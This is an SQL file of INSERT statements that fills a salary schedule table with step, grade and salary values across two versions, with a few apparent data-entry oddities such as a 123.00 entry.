INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '49894.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '50674.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '56943.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '57814.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '58701.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '59603.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '60522.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '61458.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '62410.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '63380.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '69458.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '70564.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '71690.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '72839.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '74008.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '75201.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '76415.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '77653.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '79451.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '80717.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '82005.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '83319.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '84657.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '86020.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '87409.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '88824.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '95000.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '10172.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('23', '12', '123.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '7575.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '9554.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '9000.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '9090.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '9273.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '9365.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '9649.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '9675.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '9181.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '9459.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '10270.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '12019.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '9772.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '9869.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '10716.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '9968.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '10068.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '10270.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '10373.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '10401.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '10505.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '10610.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '10823.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '10931.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '11040.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '11151.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '11181.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '11292.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '11405.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '11519.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '11635.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '11751.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '11869.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '11987.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '12139.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '12261.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '12383.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '12507.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '12632.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '12759.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '12886.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '12921.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '13050.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '13180.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '13312.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '13445.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '13580.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '13716.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '13853.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '13890.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '14029.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '14311.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '14169.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '14454.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '14598.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '14744.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '14892.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '14931.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '15081.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '15232.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '15384.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '15538.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '15693.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '15850.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '16009.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '16051.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '16212.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '16374.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '16538.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '16703.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '16870.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '17039.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '17209.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '17255.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '17428.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '17602.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '17778.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '17956.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '18135.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '18318.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '18500.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '18549.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '18735.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '18922.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '19111.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '19302.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '19495.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '19690.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '19887.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '19940.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '20140.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '20341.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '20545.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '20750.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '20958.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '21167.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '21379.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '21436.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '21650.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '21867.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '22086.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '22306.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '22529.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '22755.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '22982.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '23044.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '23274.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '23507.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '23742.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '23979.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '24219.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '24461.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '24706.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '24887.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '25161.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '25438.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '25718.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '26000.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '26286.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '26576.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '26868.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '26878.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '27174.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '27473.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '27775.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '28080.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '28389.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '28702.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '29017.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '29028.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '29348.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '29671.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '2997.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '30327.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '30327.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '30998.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '31339.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '31351.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '31696.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '32044.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '32397.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '32753.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '33113.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '33478.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '33846.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '33859.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '34231.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '34608.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '34988.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '35373.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '35762.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '36156.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '36554.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '36567.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '36970.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '37376.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '37788.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '38203.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '38623.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '39048.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '39478.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '39493.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '39927.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '40367.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '40811.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '41259.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '41713.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '42172.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '42636.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '42652.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '43121.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '43596.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '44075.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '44560.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '45050.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '45546.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '46047.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '46064.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '46571.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '47083.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '47601.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '48125.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '48654.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '49190.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '49731.00', '3');
